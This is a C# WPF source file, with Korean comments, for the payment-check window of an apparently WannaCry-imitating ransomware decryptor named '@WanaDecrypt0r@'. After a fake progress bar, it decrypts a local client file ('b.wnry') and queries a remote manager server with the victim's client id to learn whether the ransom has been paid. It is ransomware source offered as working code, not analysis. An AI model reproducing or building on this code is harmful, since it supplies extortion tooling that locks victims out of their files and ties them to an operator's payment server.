using _WanaDecryptor_.Utils.Crypto;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace _WanaDecryptor_
{
    /// <summary>
    /// CheckPayment.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class CheckPayment : Window
    {
        // 종료 버튼 클릭 여부
        private bool isExitButtonClick = false;
        // 결과 설정
        public int result = 0;




        /// <summary>
        /// 생성자
        /// </summary>
        public CheckPayment()
        {
            InitializeComponent();
        }



        /// <summary>
        /// 페이지 로딩 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            try
            {
                isExitButtonClick = false;

                result = -1;

                await Task.Run(() => 
                {
                    try
                    {
                        Random random = new Random();

                        while (true)
                        {
                            double getValue = 0;

                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                try
                                {
                                    getValue = progressBar.Value;
                                }
                                catch (Exception) { }
                            });

                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                try
                                {
                                    progressBar.Value = getValue + random.Next(1, 50);
                                }
                                catch (Exception) { }
                            });

                            Thread.Sleep(100);

                            if (getValue >= 1000)
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // 예외 발생
                        MessageBox.Show("@WanaDecrypt0r@.exe를 실행 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                });


                // 종료 작업 수행 여부
                if (!isExitButtonClick)
                {
                    // 클라이언트 정보 파일 읽기
                    AESManager aESManager = new AESManager();

                    // 클라이언트 정보 불러오기
                    string clientInfo = null;
                    await Task.Run(() =>
                    {
                        try
                        {
                            WebClient webClient = new WebClient();
                            clientInfo = webClient.DownloadString(
                                string.Format(
                                    "https://rhya-network.kro.kr/RhyaNetwork/wanacrypt0r_manager?mode=1&clientid={0}",
                                    JObject.Parse(aESManager.TextAESDecrypt(File.ReadAllText("b.wnry")))["client_id"]));
                            webClient.Dispose();
                        }
                        catch (Exception)
                        {
                            // 예외 발생
                            MessageBox.Show("서버 접속 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                        }
                    });

                    // JSON 파싱
                    JObject jObjectForClientInfoNew = JObject.Parse(HttpUtility.UrlDecode(clientInfo));
                    result = (int)jObjectForClientInfoNew["is_payment"];

                    // 창 닫기
                    this.Close();
                }
            }
            catch (Exception)
            {
                // 예외 발생
                MessageBox.Show("@WanaDecrypt0r@.exe를 실행 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }



        /// <summary>
        /// 닫기 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CancelButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // 버튼 여부 반영
                isExitButtonClick = true;

                // 결과 설정
                result = -1;

                // 창 닫기
                this.Close();
            }
            catch (Exception)
            {
                // 예외 발생
                MessageBox.Show("@WanaDecrypt0r@.exe를 실행 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
    }
}
